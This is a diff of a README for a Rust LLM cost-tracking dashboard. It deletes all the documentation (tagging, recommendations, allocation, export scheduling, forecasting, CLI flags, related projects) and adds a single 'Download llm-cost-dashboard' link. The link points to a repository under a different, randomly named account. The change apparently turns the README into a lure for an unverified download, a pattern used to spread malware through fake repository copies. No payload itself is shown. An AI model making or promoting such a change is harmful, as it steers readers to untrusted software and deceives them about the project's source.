-    pattern: TagMatch::Contains("claude".to_string()),
-    tag_key: "provider".to_string(),
-    tag_value: "anthropic".to_string(),
-});
-
-// Resolve tags for an incoming log record.
-let mut fields = HashMap::new();
-fields.insert("model".to_string(), "claude-sonnet-4-6".to_string());
-fields.insert("project".to_string(), "recommendation-engine".to_string());
-
-let tags = engine.resolve(&fields);
-assert_eq!(tags.get("provider").map(|s| s.as_str()), Some("anthropic"));
-assert_eq!(tags.get("project").map(|s| s.as_str()), Some("recommendation-engine"));
-```
-
-### Cost roll-up by tag dimension
-
-```rust
-use llm_cost_dashboard::tagging::TaggedLedger;
-
-let mut ledger = TaggedLedger::new();
-ledger.add(0.10, unix_ts, tags_for_search_team);
-ledger.add(0.20, unix_ts, tags_for_search_team);
-ledger.add(0.05, unix_ts, tags_for_billing_team);
-
-let by_team = ledger.by_tag("team");
-// Sorted from highest to lowest spend:
-for (team, total_usd) in by_team.ranked() {
-    println!("{team}: ${total_usd:.4}");
-}
-
-if let Some((top, cost)) = by_team.top_spender() {
-    println!("Top spender: {top} at ${cost:.4}");
-}
-```
-
----
-
-## Model Recommendation Engine
-
-The `recommendations` module analyses your usage patterns and suggests cheaper
-alternative models, computing projected monthly savings for each switch.
-
-```rust
-use llm_cost_dashboard::{CostLedger, CostRecord};
-use llm_cost_dashboard::recommendations::ModelRecommender;
-
-let mut ledger = CostLedger::new();
-// ... populate ledger from your request logs ...
-
-let recommender = ModelRecommender::new(&ledger);
-
-// Print all recommendations, sorted by largest projected saving.
-for s in recommender.suggest() {
-    println!("{}", s.summary_line());
-    // Example output: "claude-sonnet-4-6 → claude-haiku-4-5 | save 92% ($18.40/mo)"
-}
-
-println!(
-    "Total potential saving: ${:.2}/mo",
-    recommender.total_projected_monthly_saving()
-);
-```
-
-**Supported current models:** claude-opus-4-6, claude-sonnet-4-6, gpt-4o,
-gpt-4-turbo, o1, o3, gemini-1.5-pro, gpt-4.5-preview, mistral-large-2411, and more.
-
----
-
-## Team Cost Allocation
-
-The `allocation` module maps requests to team/project buckets using a priority-ordered
-rule list and supports chargeback/showback reporting workflows.
-
-```rust
-use llm_cost_dashboard::allocation::{AllocationEngine, AllocationRule};
-
-let mut engine = AllocationEngine::new();
-
-// Route sessions whose ID starts with "eng-" to the engineering team.
-engine.add_rule(AllocationRule {
-    rule_id: "eng-prefix".to_string(),
-    team: "engineering".to_string(),
-    project: "infra".to_string(),
-    session_prefix: Some("eng-".to_string()),
-    tag_key: None,
-    tag_value: None,
-});
-
-// Route by metadata tag for other teams.
-engine.add_rule(AllocationRule {
-    rule_id: "data-tag".to_string(),
-    team: "data-science".to_string(),
-    project: "ml-platform".to_string(),
-    session_prefix: None,
-    tag_key: Some("team".to_string()),
-    tag_value: Some("data".to_string()),
-});
-
-let allocation = engine.allocate("eng-alice-session-42", &tags);
-println!("Team: {} / Project: {}", allocation.team, allocation.project);
-```
-
----
-
-## Automated Export Scheduling
-
-The `scheduler` module runs cron-based scheduled cost exports so you always
-have up-to-date CSV/JSON reports without manual intervention.
-
-```rust
-use llm_cost_dashboard::scheduler::{ExportSchedule, ScheduledExportFormat, Scheduler};
-use llm_cost_dashboard::cost::CostLedger;
-
-let ledger = CostLedger::new();
-let mut scheduler = Scheduler::new(ledger);
-
-// Export CSV every Monday at 09:00.
-scheduler.add_schedule(ExportSchedule {
-    cron: "0 9 * * MON".to_string(),
-    format: ScheduledExportFormat::Csv,
-    output_dir: "/var/reports/llm".to_string(),
-    label: "weekly-csv".to_string(),
-});
-
-// Export JSON summary on the 1st of every month.
-scheduler.add_schedule(ExportSchedule {
-    cron: "0 8 1 * *".to_string(),
-    format: ScheduledExportFormat::JsonSummary,
-    output_dir: "/var/reports/llm".to_string(),
-    label: "monthly-summary".to_string(),
-});
-
-// Call this each tick (e.g. every minute) to fire due schedules.
-let fired = scheduler.tick(chrono::Utc::now());
-for report in fired {
-    println!("Wrote: {}", report.path);
-}
-```
-
----
-
-## Feature Gallery
-
-### Multi-Provider Cost Comparison
-
-`ProviderComparison` ranks every model in the 80+ model pricing table by projected monthly cost for your actual workload.
-
-```rust,no_run
-use llm_cost_dashboard::comparison::{ProviderComparison, WorkloadProfile};
-
-// Derive profile from your real request history.
-let profile = WorkloadProfile::from_ledger(&ledger)
-    .unwrap_or_else(|| WorkloadProfile::from_rph(1000)); // 1000 req/hr fallback
-
-let cmp = ProviderComparison::compute(&profile);
-
-println!("Cheapest: {} at ${:.2}/mo", cmp.cheapest().model, cmp.cheapest().monthly_cost_usd);
-println!("Most expensive: {} at ${:.2}/mo",
-    cmp.most_expensive().model, cmp.most_expensive().monthly_cost_usd);
-println!("Cost spread: {:.0}x", cmp.cost_spread_ratio());
-
-for proj in cmp.top_n_cheapest(10) {
-    println!("  {:<45} ${:8.2}/mo  ${:.4}/1k req  ({}) ",
-        proj.model, proj.monthly_cost_usd, proj.cost_per_1k_requests, proj.provider);
-}
-```
-
-From the CLI:
-
-```bash
-llm-dash --demo --compare --workload-rph 1000
-```
-
-The TUI shows a "Compare" tab (`c` to switch) with a full ranked table updated from your live request history.
-
-### Holt-Winters Cost Forecasting
-
-`CostForecaster` applies double exponential smoothing to project spend over the next hour, day, week, and month.  Unlike OLS, it adapts to changing spend rates (e.g. a marketing campaign that doubles traffic).
-
-```rust,no_run
-use llm_cost_dashboard::forecast::CostForecaster;
-
-let mut forecaster = CostForecaster::new();  // default α=0.3, β=0.1
-// Or tune the smoothing parameters:
-// let mut forecaster = CostForecaster::new().with_params(0.4, 0.15);
-
-// Feed cumulative spend observations (unix_secs, cumulative_usd).
-forecaster.record(1_700_000_000.0, 0.0);
-forecaster.record(1_700_003_600.0, 0.50);
-forecaster.record(1_700_007_200.0, 1.05);
-
-if let Some(hw) = forecaster.forecast(Some(100.0)) {
-    println!("Next hour:  ${:.4}", hw.next_hour_usd);
-    println!("Next day:   ${:.2}", hw.next_day_usd);
-    println!("Next week:  ${:.2}", hw.next_week_usd);
-    println!("Next month: ${:.2}", hw.next_month_usd);
-    println!("80%% CI:     [{:.4}, {:.4}]",
-        hw.confidence_interval.0, hw.confidence_interval.1);
-    if hw.budget_warning {
-        eprintln!("WARNING: forecasted spend exceeds 80%% of budget!");
-    }
-}
-```
-
-From the CLI:
-
-```bash
-# Print a forecast summary and exit.
-llm-dash --demo --forecast
-```
-
-The TUI shows a "Projected Spend" panel that updates every tick.  When the forecast exceeds 80 % of the budget the panel turns red.
-
-### Anomaly Detection
-
-The `anomaly` module applies a rolling Z-score to the per-request cost time series.  Any request whose cost deviates more than 3σ from the rolling mean triggers an alert.
-
-### Session Tracking
-
-`session::SessionLedger` groups requests by session ID, enforces per-session budgets, and surfaces per-session spend in the TUI.
-
-### Export
-
-Press `e` in the TUI to dump the current session to `llm-costs-<timestamp>.json` and `llm-costs-<timestamp>.csv` in the working directory.
-
-```bash
-# Programmatic export via the HTTP API (--serve mode).
-curl http://localhost:8080/api/export.json > session.json
-curl http://localhost:8080/api/export.csv  > session.csv
-```
-
-### Configuration Reference
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--budget USD` | `10.0` | Monthly hard budget limit |
-| `--log-file PATH` | — | NDJSON file to tail |
-| `--demo` | off | Pre-load synthetic demo data |
-| `--serve PORT` | — | Start HTTP API on given port alongside TUI |
-| `--webhook-url URL` | — | Slack/generic webhook destination (repeatable) |
-| `--webhook-threshold USD` | 80 % of `--budget` | USD spend level that triggers webhook |
-| `--webhook-format` | `generic` | `slack` or `generic` |
-| `--compare` | off | Show multi-provider cost comparison panel |
-| `--workload-rph N` | derived from log | Requests per hour for comparison projection |
-| `--forecast` | off | Print Holt-Winters forecast summary and exit |
-
-### Keyboard Controls (TUI)
-
-| Key | Action |
-|-----|--------|
-| `q` / `Esc` | Quit |
-| `r` | Reset all data |
-| `d` | Load demo data |
-| `e` | Export session to JSON + CSV |
-| `j` / `Down` | Scroll requests down |
-| `k` / `Up` | Scroll requests up |
-| `c` | Switch to Compare tab |
-| `f` | Switch to Forecast tab |
-
----
-
-## Related projects by @Mattbusel
-
-- [tokio-prompt-orchestrator](https://github.com/Mattbusel/tokio-prompt-orchestrator) -- Rust async LLM pipeline orchestration
-- [rot-signals-api](https://github.com/Mattbusel/rot-signals-api) -- Options signal REST API
-- [prompt-observatory](https://github.com/Mattbusel/prompt-observatory) -- LLM interpretability dashboard
-
----
-
-## License
-
-MIT -- see [LICENSE](LICENSE) for details.
+[Download llm-cost-dashboard](https://github.com/abject-milkingmachine273/llm-cost-dashboard)
